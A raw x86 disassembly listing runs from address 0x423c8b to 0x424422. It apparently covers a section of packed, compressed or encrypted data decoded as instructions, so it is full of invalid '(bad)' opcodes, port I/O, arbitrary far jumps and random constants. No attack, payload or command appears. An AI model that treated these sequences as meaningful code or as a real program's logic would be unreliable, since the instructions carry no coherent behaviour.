  423c8b:	les    ecx,FWORD PTR [edi+0x16]
  423c8e:	in     eax,dx
  423c8f:	xchg   ecx,eax
  423c90:	xor    BYTE PTR ds:0x875c14eb,bl
  423c96:	(bad)  
  423c97:	jo     0x423c19
  423c99:	loope  0x423c74
  423c9b:	fmul   DWORD PTR [edx+0x1]
  423c9e:	test   eax,0x34bc960b
  423ca3:	loope  0x423ce3
  423ca5:	push   es
  423ca6:	add    eax,0x8a37ec02
  423cab:	inc    edi
  423cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cad:	es pop es
  423caf:	jecxz  0x423cf8
  423cb1:	push   0x5b
  423cb3:	clc    
  423cb4:	mov    ecx,0x3a4ba879
  423cb9:	pop    esp
  423cba:	mov    cl,0xc
  423cbc:	sbb    al,bl
  423cbe:	and    edx,ebx
  423cc0:	adc    eax,0xdcc4f931
  423cc5:	stos   DWORD PTR es:[edi],eax
  423cc6:	sub    al,0x4d
  423cc8:	xor    ecx,DWORD PTR [edi+0x59da7a3c]
  423cce:	jnp    0x423c8f
  423cd0:	mov    esp,0x53ec394e
  423cd5:	in     eax,dx
  423cd6:	xlat   BYTE PTR ds:[ebx]
  423cd7:	data16 (bad) 
  423cd9:	rcl    DWORD PTR [ecx-0x5c],1
  423cdc:	hlt    
  423cdd:	cli    
  423cde:	push   DWORD PTR [ebx+0x20]
  423ce1:	outs   dx,BYTE PTR ds:[esi]
  423ce2:	or     BYTE PTR [eax],ch
  423ce4:	mov    bh,0xe1
  423ce6:	mov    ebx,0x99c45767
  423ceb:	loop   0x423d6b
  423ced:	std    
  423cee:	pushf  
  423cef:	js     0x423cb6
  423cf1:	inc    esp
  423cf2:	and    esi,DWORD PTR [ebp+0x33c85754]
  423cf8:	icebp  
  423cf9:	bound  ecx,QWORD PTR [edx]
  423cfb:	ds jo  0x423d25
  423cfe:	enter  0x5062,0x64
  423d02:	or     DWORD PTR [ebp-0x2c],esp
  423d05:	ds cmc 
  423d07:	jne    0x423d1d
  423d09:	icebp  
  423d0a:	pop    ecx
  423d0b:	je     0x423d32
  423d0d:	test   al,0x29
  423d0f:	dec    ebp
  423d10:	push   edi
  423d11:	pusha  
  423d12:	xor    al,0x7b
  423d14:	or     al,0xe6
  423d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d17:	jns    0x423d77
  423d19:	jne    0x423ce4
  423d1b:	xchg   edi,eax
  423d1c:	cmp    ebx,eax
  423d1e:	in     al,dx
  423d1f:	sbb    al,0xf
  423d21:	add    al,0x0
  423d23:	add    BYTE PTR [eax],al
  423d25:	add    BYTE PTR [eax],al
  423d27:	add    BYTE PTR [eax],al
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax+0x4910fe6e],ah
  423d38:	mov    ecx,0x1cb500b
  423d3d:	add    BYTE PTR [eax-0x64fffffa],al
  423d43:	jb     0x423ce2
  423d45:	push   esp
  423d46:	lahf   
  423d47:	retf   0xf70e
  423d4a:	pop    esp
  423d4b:	(bad)  
  423d4c:	in     eax,0xa2
  423d4e:	push   ss
  423d4f:	sbb    bh,ch
  423d51:	pop    ecx
  423d52:	xchg   ebp,eax
  423d53:	ja     0x423d73
  423d55:	sbb    al,0x3b
  423d57:	mov    al,0x66
  423d59:	bound  ebp,QWORD PTR [edx+esi*2-0x20]
  423d5d:	icebp  
  423d5e:	inc    esi
  423d5f:	cli    
  423d60:	shl    BYTE PTR [edx+edx*8-0x22821672],1
  423d67:	bound  edi,QWORD PTR [eax+eiz*1]
  423d6a:	adc    ax,0x8e55
  423d6e:	pop    eax
  423d6f:	test   eax,0x7c4b82ba
  423d74:	mov    esp,eax
  423d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d77:	or     BYTE PTR [esi+0x3b],cl
  423d7a:	stc    
  423d7b:	pop    ss
  423d7c:	leave  
  423d7d:	aam    0xe7
  423d7f:	or     BYTE PTR [eax+0x3e],al
  423d82:	aas    
  423d83:	mov    cl,0x64
  423d85:	cmp    bh,BYTE PTR [esi]
  423d87:	fs icebp 
  423d89:	ret    
  423d8a:	sbb    DWORD PTR [ebx],edx
  423d8c:	mov    cl,0xec
  423d8e:	test   al,0x94
  423d90:	xor    dh,BYTE PTR [edx]
  423d92:	push   cs
  423d93:	xchg   edi,eax
  423d94:	stos   BYTE PTR es:[edi],al
  423d95:	add    BYTE PTR [ecx+0x4e9ee403],dl
  423d9b:	xchg   DWORD PTR [ebx],eax
  423d9d:	fstp   QWORD PTR [eax+0x1ff0adaa]
  423da3:	retf   0x3d41
  423da6:	cdq    
  423da7:	lds    ecx,FWORD PTR [ebx-0x75d3874a]
  423dad:	add    al,0x9a
  423daf:	jo     0x423d76
  423db1:	je     0x423d99
  423db3:	pop    es
  423db4:	rol    DWORD PTR [ebx-0x56eb89be],1
  423dba:	outs   dx,BYTE PTR ds:[esi]
  423dbb:	mov    ebp,DWORD PTR [ebx-0x78a7805e]
  423dc1:	cwde   
  423dc2:	repnz (bad) 
  423dc4:	sbb    ebp,DWORD PTR [edi+0x4e]
  423dc7:	or     esi,ecx
  423dc9:	je     0x423e02
  423dcb:	sti    
  423dcc:	fcom   QWORD PTR [edx+edx*2+0x4ac17e23]
  423dd3:	xor    DWORD PTR [ecx],edi
  423dd5:	jmp    0x763c:0x27c9dafa
  423ddc:	daa    
  423ddd:	fld    TBYTE PTR [ecx-0x2a]
  423de0:	adc    edx,ecx
  423de2:	jp     0x423da5
  423de4:	mov    al,ds:0xca74d91d
  423de9:	push   0x9937d96d
  423dee:	aas    
  423def:	sub    BYTE PTR [ebx-0x4d],ah
  423df2:	xchg   esp,eax
  423df3:	xor    edi,esi
  423df5:	daa    
  423df6:	add    eax,0x8bc12c97
  423dfb:	mov    es,WORD PTR [edx]
  423dfd:	xchg   ebp,eax
  423dfe:	push   ebp
  423dff:	in     al,0x86
  423e01:	sub    al,0xe2
  423e03:	sub    al,0xac
  423e05:	xchg   ebp,eax
  423e06:	les    eax,FWORD PTR [ecx]
  423e08:	lea    eax,[edi]
  423e0a:	inc    eax
  423e0b:	dec    ebx
  423e0c:	pop    ebp
  423e0d:	shl    BYTE PTR [edi+ecx*8],cl
  423e10:	fcomi  st,st(5)
  423e12:	ds mov dh,bl
  423e15:	pop    es
  423e16:	(bad)  
  423e18:	dec    ebp
  423e19:	cli    
  423e1a:	ret    0x464
  423e1d:	adc    al,0x8c
  423e1f:	cmp    BYTE PTR [eax],0x5a
  423e22:	sbb    DWORD PTR [eax+0x24],ebx
  423e25:	retf   
  423e26:	mov    ah,0x17
  423e28:	push   edi
  423e29:	pusha  
  423e2a:	mov    ebx,0xa5f3d611
  423e2f:	dec    edi
  423e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e31:	sub    BYTE PTR [esi-0x71],ch
  423e34:	xor    edx,DWORD PTR [eax]
  423e36:	popa   
  423e37:	and    BYTE PTR [edi],cl
  423e39:	jae    0x423e8e
  423e3b:	stc    
  423e3c:	cdq    
  423e3d:	imul   ebx,DWORD PTR [edx+0x55],0x7e
  423e41:	(bad)  
  423e42:	push   eax
  423e43:	push   ss
  423e44:	(bad)  
  423e45:	dec    esi
  423e46:	mov    al,BYTE PTR [ebx-0x2b48aa64]
  423e4c:	sub    eax,0x75313d1
  423e51:	cmp    DWORD PTR [edi],0x37
  423e54:	sub    bl,0xa3
  423e57:	jb     0x423e29
  423e59:	jl     0x423e6e
  423e5b:	xlat   BYTE PTR es:[ebx]
  423e5d:	loope  0x423e40
  423e5f:	add    DWORD PTR [esi],ebx
  423e61:	inc    esi
  423e62:	(bad)  
  423e63:	dec    ebx
  423e64:	mov    ah,0x9
  423e66:	ret    
  423e67:	jbe    0x423ee0
  423e69:	lods   eax,DWORD PTR ds:[esi]
  423e6a:	in     al,0x52
  423e6c:	pushf  
  423e6d:	inc    edi
  423e6e:	es xchg esi,eax
  423e70:	mov    edx,0x3ff87c53
  423e75:	rol    DWORD PTR [edx+0x6e05a11d],cl
  423e7b:	dec    edx
  423e7c:	dec    esp
  423e7d:	push   ebx
  423e7e:	jno    0x423e8e
  423e80:	out    0x52,al
  423e82:	jmp    0x29cb:0xa266b44d
  423e89:	ret    
  423e8a:	pushf  
  423e8b:	mov    esi,0xa6ab3680
  423e90:	cs cmp eax,0xfa03d019
  423e96:	jecxz  0x423eed
  423e98:	xor    al,0xe8
  423e9a:	ret    0x77d5
  423e9d:	ds mov bl,0x9c
  423ea0:	nop
  423ea1:	nop
  423ea2:	add    eax,0xb5a8cc9b
  423ea7:	cmc    
  423ea8:	loop   0x423e4a
  423eaa:	cwde   
  423eab:	mov    ds:0x513f0f83,al
  423eb0:	movq   mm3,QWORD PTR [ebx-0x67]
  423eb4:	xor    al,0x83
  423eb6:	sub    al,0xb3
  423eb8:	pop    ss
  423eb9:	mov    WORD PTR [edi],fs
  423ebb:	aas    
  423ebc:	mov    al,0x9c
  423ebe:	inc    edi
  423ebf:	mov    edx,0x50e84ef
  423ec4:	cmp    al,0x4c
  423ec6:	hlt    
  423ec7:	sub    eax,0xbef8f8dd
  423ecc:	inc    edx
  423ecd:	mov    cs,WORD PTR [eax+ebp*2+0x7b384f2b]
  423ed4:	jae    0x423f53
  423ed6:	push   ss
  423ed7:	add    edx,ebx
  423ed9:	xchg   ecx,eax
  423eda:	test   eax,0x23fc722e
  423edf:	jp     0x423e8b
  423ee1:	mov    ebx,0x2b084483
  423ee6:	nop
  423ee7:	pop    esp
  423ee8:	mov    ch,0x57
  423eea:	xchg   edx,eax
  423eeb:	dec    edi
  423eec:	sti    
  423eed:	mov    DWORD PTR [ebx],ebp
  423eef:	cmp    eax,0x5ba54acc
  423ef4:	add    al,BYTE PTR [edi]
  423ef6:	dec    edi
  423ef7:	sub    DWORD PTR [esi],esp
  423ef9:	mov    dl,0x45
  423efb:	add    eax,0x37b4bbff
  423f00:	ja     0x423f02
  423f02:	ins    BYTE PTR es:[edi],dx
  423f03:	pusha  
  423f04:	jno    0x423f22
  423f06:	mov    edx,DWORD PTR [ebx]
  423f08:	jno    0x423f75
  423f0a:	jmp    0x5ae7:0x149efcec
  423f11:	cli    
  423f12:	mov    eax,DWORD PTR [eax]
  423f14:	pop    ecx
  423f15:	pop    ss
  423f16:	das    
  423f17:	addr16 pop esi
  423f19:	cmp    eax,0xda1a871f
  423f1e:	daa    
  423f1f:	mov    eax,0x8c7eb7cf
  423f24:	pop    edi
  423f25:	xchg   BYTE PTR [edi+0x276b108c],bh
  423f2b:	rol    dl,cl
  423f2d:	fld    QWORD PTR [eax+eiz*8+0x2f7353ed]
  423f34:	jae    0x423ed0
  423f36:	and    al,0xe9
  423f38:	dec    edx
  423f39:	dec    esi
  423f3a:	sub    BYTE PTR [ebp+edx*4+0x612bf33],bl
  423f41:	mov    ah,0x7b
  423f43:	pop    eax
  423f44:	inc    edi
  423f45:	add    BYTE PTR [edi-0x12827d1d],bh
  423f4b:	xor    al,0xa9
  423f4d:	ds xchg edx,eax
  423f4f:	cmp    eax,0x37627261
  423f54:	dec    esp
  423f55:	scas   eax,DWORD PTR es:[edi]
  423f56:	loope  0x423f9c
  423f58:	jge    0x423fbb
  423f5a:	cli    
  423f5b:	out    dx,eax
  423f5c:	shl    BYTE PTR [ebx+0x7f],0x1e
  423f60:	aam    0x45
  423f62:	xchg   edi,eax
  423f63:	sbb    al,0x85
  423f65:	adc    ch,ch
  423f67:	jae    0x423f2c
  423f69:	enter  0x8101,0xd9
  423f6d:	dec    ebp
  423f6e:	neg    BYTE PTR [edx+eiz*8-0x57]
  423f72:	pop    edx
  423f73:	jp     0x423f11
  423f75:	and    ch,BYTE PTR [ebx]
  423f77:	or     dh,BYTE PTR [ebx+0x62]
  423f7a:	mov    esi,0xe24fc5b9
  423f7f:	cmp    ecx,DWORD PTR [esi]
  423f81:	out    dx,eax
  423f82:	bound  eax,QWORD PTR [esi+edi*8+0x5c]
  423f86:	clc    
  423f87:	nop
  423f88:	inc    esp
  423f89:	xchg   edi,eax
  423f8a:	cmp    eax,ecx
  423f8c:	push   eax
  423f8d:	sahf   
  423f8e:	aas    
  423f8f:	mov    bh,0x8f
  423f91:	mov    bh,0xd9
  423f93:	adc    DWORD PTR [ecx+0x35593f37],ebp
  423f99:	leave  
  423f9a:	call   0x1f74:0xa884571d
  423fa1:	es mov ah,0x5b
  423fa4:	outs   dx,BYTE PTR ds:[esi]
  423fa5:	ins    BYTE PTR es:[edi],dx
  423fa6:	loop   0x423f43
  423fa8:	es scas al,BYTE PTR es:[edi]
  423faa:	fnstsw WORD PTR [esi+eiz*4]
  423fad:	jo     0x423fc0
  423faf:	je     0x423f59
  423fb1:	test   BYTE PTR [edx+0x2e],bh
  423fb4:	lods   al,BYTE PTR ds:[esi]
  423fb5:	into   
  423fb6:	loopne 0x423f4c
  423fb8:	sbb    DWORD PTR [ebx-0xd993550],ebp
  423fbe:	add    ch,cl
  423fc0:	jnp    0x423ff7
  423fc2:	dec    edi
  423fc3:	inc    esi
  423fc4:	fnstenv [ebp+0x6f197f46]
  423fca:	je     0x423f93
  423fcc:	popf   
  423fcd:	cmp    al,0x9a
  423fcf:	add    eax,0xc07349f5
  423fd4:	xlat   BYTE PTR ds:[ebx]
  423fd5:	adc    al,BYTE PTR [ebx+0xfb3a247]
  423fdb:	sub    bl,BYTE PTR gs:[ebp-0x80]
  423fdf:	add    DWORD PTR [ebp-0xd],ecx
  423fe2:	xor    dh,BYTE PTR [edi+0x3b]
  423fe5:	pop    eax
  423fe6:	ins    BYTE PTR es:[edi],dx
  423fe7:	jge    0x423fae
  423fe9:	je     0x423fca
  423feb:	loope  0x42404c
  423fed:	call   0xfae8:0x99dd77d4
  423ff4:	mov    bh,0xa6
  423ff6:	cmp    al,0x99
  423ff8:	arpl   WORD PTR [eax+0x522585],bx
  423ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fff:	inc    edx
  424000:	test   DWORD PTR [edi],0x533dd3c5
  424006:	jbe    0x424078
  424008:	pop    esi
  424009:	pusha  
  42400a:	inc    ecx
  42400b:	sbb    eax,0x35d85290
  424010:	repnz repz out dx,al
  424013:	pop    edx
  424014:	jecxz  0x424002
  424016:	ror    DWORD PTR [edi-0x42],cl
  424019:	cs dec ebp
  42401b:	inc    ecx
  42401c:	pop    ds
  42401d:	add    edx,esi
  42401f:	mov    eax,ds:0x4422036c
  424024:	mov    ch,0x8f
  424026:	cdq    
  424027:	adc    BYTE PTR [eax],al
  424029:	xchg   esp,eax
  42402a:	inc    ebp
  42402b:	and    eax,0x69c85d6c
  424030:	sbb    al,0x4
  424032:	inc    edi
  424033:	xabort 0x46
  424036:	pop    ecx
  424037:	(bad)  [esi-0x83af0e1]
  42403d:	xchg   esi,eax
  42403e:	cmp    al,0xc2
  424040:	push   edi
  424041:	or     esp,esi
  424043:	sbb    al,0xb0
  424045:	add    esp,DWORD PTR [ebx+edx*8+0x4b]
  424049:	or     esi,DWORD PTR [edi-0x7476850f]
  42404f:	cmp    edx,edi
  424051:	xchg   edi,eax
  424052:	and    eax,DWORD PTR [esi]
  424054:	retf   
  424055:	fdiv   QWORD PTR [esi-0x41]
  424058:	push   cs
  424059:	aas    
  42405a:	(bad)  
  42405b:	sub    al,0xdc
  42405d:	aaa    
  42405e:	fcomp  DWORD PTR [eax+0x2]
  424061:	pop    ecx
  424062:	pop    ds
  424063:	ret    
  424064:	fdivrp st(3),st
  424066:	inc    ecx
  424067:	retf   
  424068:	das    
  424069:	imul   ecx,DWORD PTR [ebx],0xcdffda1a
  42406f:	outs   dx,BYTE PTR ds:[esi]
  424070:	push   cx
  424072:	test   BYTE PTR [edx+0x2],ah
  424075:	cdq    
  424076:	out    0x2d,al
  424078:	test   al,0xb6
  42407a:	add    ebp,DWORD PTR [edi]
  42407c:	push   0x3f769bc2
  424081:	and    ecx,ebp
  424083:	jne    0x424096
  424085:	xor    bh,BYTE PTR [edx]
  424087:	add    eax,0x34d617ad
  42408c:	aam    0xf2
  42408e:	sbb    dl,ah
  424090:	(bad)  
  424091:	jne    0x42408c
  424093:	js     0x424093
  424095:	shl    bh,cl
  424097:	sar    DWORD PTR [ebx-0x6f],cl
  42409a:	repz mov ds:0x9f1d0fb9,eax
  4240a0:	es fwait
  4240a2:	lea    edi,[ecx-0x6d]
  4240a5:	pop    ebx
  4240a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240a8:	sub    eax,eax
  4240aa:	imul   edi,edx,0xffffffa7
  4240ad:	xchg   ebp,eax
  4240ae:	push   0x496bfd0e
  4240b3:	(bad)  
  4240b4:	retf   0x753c
  4240b7:	or     al,0x6b
  4240b9:	jecxz  0x4240e3
  4240bb:	test   BYTE PTR [eax+eax*1+0x37d71718],dh
  4240c2:	mov    ds,WORD PTR [ecx]
  4240c4:	int    0xb2
  4240c6:	enter  0xfa5c,0xc7
  4240ca:	pop    ebx
  4240cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240cc:	into   
  4240cd:	pop    ss
  4240ce:	jbe    0x4240ad
  4240d0:	cs addr16 push cs
  4240d3:	jo     0x4240e8
  4240d5:	mov    esi,0x18a0c561
  4240da:	cmp    BYTE PTR [esp+ebx*2],dl
  4240dd:	dec    esi
  4240de:	jmp    0xc3f2b128
  4240e3:	xor    eax,DWORD PTR [edx+0x5]
  4240e6:	jg     0x4240b3
  4240e8:	xor    BYTE PTR [eax+0x5f],ch
  4240eb:	rcl    ah,1
  4240ed:	dec    ah
  4240ef:	fwait
  4240f0:	xor    DWORD PTR [esp+ebp*2],edi
  4240f3:	jns    0x424143
  4240f5:	cmp    eax,0xbe0f47d4
  4240fa:	test   al,0x62
  4240fc:	jle    0x4240e8
  4240fe:	aam    0xd2
  424100:	pop    esp
  424101:	call   0xb3ac1321
  424106:	sub    esp,DWORD PTR [ecx+0x79c62137]
  42410c:	in     al,0xf4
  42410e:	ret    
  42410f:	call   0x543b:0xcb0964ee
  424116:	sub    al,0xff
  424118:	fldenv [eax]
  42411a:	push   eax
  42411b:	loope  0x42413e
  42411d:	pop    es
  42411e:	sub    BYTE PTR [edx+0x48d2e516],al
  424124:	outs   dx,DWORD PTR fs:[esi]
  424126:	sti    
  424127:	sbb    eax,0x2b32f7a4
  42412c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42412d:	jle    0x42417e
  42412f:	jle    0x4240e3
  424131:	gs out dx,eax
  424133:	mov    DWORD PTR [ebx-0x2d],esp
  424136:	inc    edx
  424137:	ja     0x4240e6
  424139:	push   esi
  42413a:	jl     0x424121
  42413c:	mov    al,0x9b
  42413e:	pusha  
  42413f:	out    dx,eax
  424140:	mov    dl,0x20
  424142:	push   esp
  424143:	popa   
  424144:	jnp    0x42415c
  424146:	(bad)  
  424147:	sti    
  424148:	punpckhdq mm2,QWORD PTR [esi]
  42414b:	int3   
  42414c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42414d:	imul   eax,DWORD PTR [edi+0x4d],0x5d3dbc66
  424154:	adc    DWORD PTR [eax+0x30293b79],0xffffffa8
  42415b:	lds    ebp,FWORD PTR [ebp+0x7e]
  42415e:	repnz sbb eax,0x6ef85414
  424164:	(bad)  
  424165:	(bad)  
  424166:	fidivr WORD PTR [edx-0x609fe8e3]
  42416c:	mov    ah,0x8b
  42416e:	das    
  42416f:	xchg   DWORD PTR [edx+0x15],esp
  424172:	test   eax,0x311e8c5b
  424177:	pop    ds
  424178:	sub    BYTE PTR [edi+0x51eb17df],bl
  42417e:	retf   
  42417f:	xchg   BYTE PTR [ebx+0x25e3b354],dh
  424185:	sub    ah,cl
  424187:	inc    sp
  424189:	cmp    bl,BYTE PTR [ecx-0x301c29e0]
  42418f:	dec    edi
  424190:	cmp    dl,BYTE PTR [edi+0x5abfd207]
  424196:	or     BYTE PTR [ebx+0x64601b72],al
  42419c:	fmul   DWORD PTR fs:0xb68b78ac
  4241a3:	daa    
  4241a4:	les    edi,FWORD PTR [esi-0x59]
  4241a7:	cmp    BYTE PTR [esp+edi*1+0x5d2259a9],bh
  4241ae:	(bad)  
  4241af:	cmp    DWORD PTR [edx+ecx*1+0x49015b11],ebx
  4241b6:	ins    BYTE PTR es:[edi],dx
  4241b7:	xchg   esi,eax
  4241b9:	inc    ecx
  4241ba:	jl     0x424205
  4241bc:	adc    DWORD PTR [edi-0x6f],esi
  4241bf:	les    ebx,FWORD PTR ds:0x9068de3e
  4241c5:	and    edi,ecx
  4241c7:	cld    
  4241c8:	mov    eax,DWORD PTR [edi+esi*1]
  4241cb:	add    al,0x6e
  4241cd:	mov    cs,WORD PTR [ebx+ecx*4-0x20]
  4241d1:	cwde   
  4241d2:	push   0xffffff98
  4241d4:	dec    edx
  4241d5:	jmp    0x424224
  4241d7:	and    ch,ah
  4241d9:	repz push es
  4241db:	dec    eax
  4241dc:	mov    ah,0x7f
  4241de:	popf   
  4241df:	aaa    
  4241e0:	arpl   bx,cx
  4241e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241e3:	fldenv [eax]
  4241e5:	add    dh,ah
  4241e7:	push   edi
  4241e8:	(bad)  
  4241e9:	jl     0x424259
  4241eb:	loop   0x424265
  4241ed:	dec    edi
  4241ee:	xchg   edi,eax
  4241ef:	int    0xc7
  4241f1:	ret    0x5981
  4241f4:	in     eax,dx
  4241f5:	dec    ecx
  4241f6:	push   ebx
  4241f7:	mov    ebp,DWORD PTR [ecx-0xb]
  4241fa:	mov    es,WORD PTR [edx+0x14d2678f]
  424200:	or     ah,BYTE PTR ds:[edx-0x78022e78]
  424207:	ror    DWORD PTR [eax-0x77],cl
  42420a:	fld    DWORD PTR [edx]
  42420c:	inc    edx
  42420d:	loop   0x424273
  42420f:	inc    ecx
  424210:	dec    eax
  424211:	call   ebp
  424213:	sub    edx,eax
  424215:	into   
  424216:	mov    bh,0x32
  424218:	rol    BYTE PTR [ebp+0x42],0xe3
  42421c:	not    BYTE PTR [edx+0x61]
  42421f:	jecxz  0x424247
  424221:	fs mov dh,ah
  424224:	nop
  424225:	sbb    BYTE PTR [ebx+eiz*1-0x7e5926e9],cl
  42422c:	mov    esp,0x823e1c23
  424231:	in     al,dx
  424232:	addr16 push ebx
  424234:	inc    esi
  424235:	in     eax,0x77
  424237:	sub    DWORD PTR [edx],0x3895988b
  42423d:	les    edi,FWORD PTR [ecx+0x4d23a6b0]
  424243:	fld    DWORD PTR [ebx-0x498ad469]
  424249:	sbb    ebx,DWORD PTR [ebp-0x39]
  42424c:	cs je  0x4241e2
  42424f:	hlt    
  424250:	xchg   esp,eax
  424251:	in     eax,dx
  424252:	sub    al,BYTE PTR [edi]
  424254:	sbb    edx,esp
  424256:	mov    esp,0xc54f17f4
  42425b:	pop    ecx
  42425c:	add    BYTE PTR [ecx-0x42],al
  42425f:	lds    ebx,FWORD PTR [esi-0x6bfd6696]
  424265:	mov    ebx,0x1e236548
  42426a:	xchg   ebp,eax
  42426b:	push   edi
  42426c:	xchg   edi,eax
  42426d:	cmp    DWORD PTR [edi-0x13],ebx
  424270:	dec    esp
  424271:	ret    0x7b87
  424274:	or     edx,eax
  424276:	pop    esi
  424277:	int    0x1e
  424279:	shr    eax,cl
  42427b:	adc    al,0xc1
  42427d:	jo     0x424228
  42427f:	mov    ds:0x67dd802b,al
  424284:	retf   0xfa71
  424287:	or     ebx,DWORD PTR ds:0x3c29a0c
  42428d:	das    
  42428e:	mov    edi,0x6c9e264b
  424293:	outs   dx,BYTE PTR ds:[esi]
  424294:	retf   0xb225
  424297:	jge    0x4242b8
  424299:	lds    esp,FWORD PTR [edi]
  42429b:	xchg   edi,eax
  42429c:	dec    BYTE PTR [esi-0x34]
  42429f:	pop    eax
  4242a0:	mov    eax,ds:0xe936df0a
  4242a5:	out    dx,eax
  4242a6:	aaa    
  4242a7:	inc    edi
  4242a8:	inc    esp
  4242a9:	imul   esi,DWORD PTR [edi-0x38392114],0x917161f2
  4242b3:	in     al,0xf4
  4242b5:	or     DWORD PTR ds:[ebx],edi
  4242b8:	sub    ch,0x8b
  4242bb:	jae    0x4242f5
  4242bd:	aaa    
  4242be:	rcr    BYTE PTR ds:[eax],0xc0
  4242c2:	bound  edx,QWORD PTR [ebx-0x41]
  4242c5:	xchg   ecx,eax
  4242c6:	jb     0x4242bb
  4242c8:	cmp    esi,ebp
  4242ca:	je     0x42429b
  4242cc:	fisubr DWORD PTR [ecx+0x37]
  4242cf:	lods   al,BYTE PTR ds:[esi]
  4242d0:	or     dh,0x7a
  4242d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242d4:	and    ebx,edx
  4242d6:	mov    DWORD PTR ds:0xc1abdd01,esp
  4242dc:	pop    esi
  4242dd:	jmp    0x2605:0xcda23dab
  4242e4:	shl    BYTE PTR es:[eax+ebx*4+0xb3ab66c],cl
  4242ec:	loopne 0x424304
  4242ee:	cmp    al,0x11
  4242f0:	inc    ebx
  4242f1:	out    0xd1,al
  4242f3:	mov    bh,BYTE PTR [edx+0x7772aac6]
  4242f9:	pop    es
  4242fa:	jecxz  0x4242dd
  4242fc:	in     eax,0x16
  4242fe:	ffreep st(7)
  424300:	add    ah,dl
  424302:	xchg   ebx,eax
  424303:	stos   BYTE PTR es:[edi],al
  424304:	pop    ds
  424305:	xchg   BYTE PTR [ecx],bl
  424307:	cs xor al,0x82
  42430a:	push   esp
  42430b:	data16 xlat BYTE PTR ds:[ebx]
  42430d:	jo     0x42432e
  42430f:	jmp    0xf4cc:0x7376af17
  424316:	mov    dh,0xff
  424318:	mov    ds:0xc38dfdbc,eax
  42431d:	(bad)  
  42431e:	ror    BYTE PTR [ebp+0x1],cl
  424321:	fbld   TBYTE PTR [esi-0x57]
  424324:	xchg   ebp,eax
  424325:	sub    al,0x58
  424327:	xor    cl,bl
  424329:	mov    edx,cs
  42432b:	push   ebp
  42432c:	repz fwait
  42432e:	sub    al,0xac
  424330:	cmc    
  424331:	sbb    eax,0x73c2abcc
  424336:	add    cl,BYTE PTR [edi+0x1c615c31]
  42433c:	xchg   DWORD PTR [edi-0x2cf1e53e],ecx
  424342:	out    dx,eax
  424343:	cdq    
  424344:	fdiv   QWORD PTR [ecx]
  424346:	stc    
  424347:	fst    st(7)
  424349:	out    0x4c,eax
  42434b:	dec    esi
  42434c:	lds    ecx,FWORD PTR [ecx+0x3d]
  42434f:	sbb    dl,ah
  424351:	inc    edx
  424352:	call   0xd009669c
  424357:	(bad)
  42435b:	inc    ecx
  42435c:	repz mov ah,0xc3
  42435f:	mov    cl,0x3b
  424361:	cwde   
  424362:	add    DWORD PTR [ebx+0x6527f941],ebp
  424368:	xor    ecx,ebp
  42436a:	inc    esi
  42436b:	dec    edi
  42436c:	sub    BYTE PTR [edx+edi*2+0x31cbb562],dl
  424373:	(bad)  [ecx-0x61943b4c]
  424379:	(bad)  
  42437a:	fwait
  42437b:	imul   cl
  42437d:	repnz bound edx,QWORD PTR [esi-0x5f]
  424381:	out    dx,al
  424382:	in     al,0xbb
  424384:	cli    
  424385:	imul   esp,DWORD PTR [edx],0xffffffce
  424388:	in     al,0xa9
  42438a:	cld    
  42438b:	pusha  
  42438c:	sub    eax,0x7bf1c252
  424391:	push   ebp
  424392:	test   edi,edx
  424394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424395:	iret   
  424396:	into   
  424397:	sub    DWORD PTR [ecx],ebp
  424399:	sub    BYTE PTR [edi+0x15],0xe2
  42439d:	inc    DWORD PTR [eax]
  42439f:	out    0x3a,eax
  4243a1:	pop    edi
  4243a2:	gs iret 
  4243a4:	dec    ebp
  4243a5:	dec    bh
  4243a7:	pop    ebp
  4243a8:	mov    bh,0xb
  4243aa:	xchg   edi,eax
  4243ab:	inc    esi
  4243ac:	loop   0x4243b2
  4243ae:	(bad)  
  4243af:	loopne 0x4243cc
  4243b1:	mov    ebx,0x4974aa3c
  4243b6:	sahf   
  4243b7:	adc    eax,0xd40f52ec
  4243bc:	in     eax,dx
  4243bd:	repz sbb DWORD PTR [ebx+0xa230],ebx
  4243c4:	add    BYTE PTR [eax],al
  4243c6:	add    BYTE PTR [eax],al
  4243c8:	add    BYTE PTR [eax],al
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424386
  4243d7:	test   al,0x4c
  4243d9:	hlt    
  4243da:	rcl    cl,1
  4243dc:	add    DWORD PTR [eax],eax
  4243de:	add    BYTE PTR [esi],0x0
  4243e1:	add    dl,ch
  4243e3:	call   0xfdcd:0x2fbd0d4d
  4243ea:	mov    ah,0x25
  4243ec:	or     BYTE PTR [eax-0xf28c636],0x14
  4243f3:	xlat   BYTE PTR ds:[ebx]
  4243f4:	into   
  4243f5:	jno    0x424438
  4243f7:	stc    
  4243f8:	jns    0x4243db
  4243fa:	adc    BYTE PTR [ebx-0x35],dh
  4243fd:	mov    BYTE PTR [ebx+0x57],ch
  424400:	shl    BYTE PTR [edx+0x4a],0xb6
  424404:	add    DWORD PTR ds:0xe3b08597,ebx
  42440a:	xor    DWORD PTR [ebp+ebp*4+0x5],ebp
  42440e:	xor    eax,0x44763b12
  424413:	es (bad) 
  424415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424416:	mov    edx,0x5b364952
  42441b:	mov    dl,0x3a
  42441d:	fwait
  42441e:	mov    ch,0x96
  424420:	jb     0x424401
  424422:	daa    
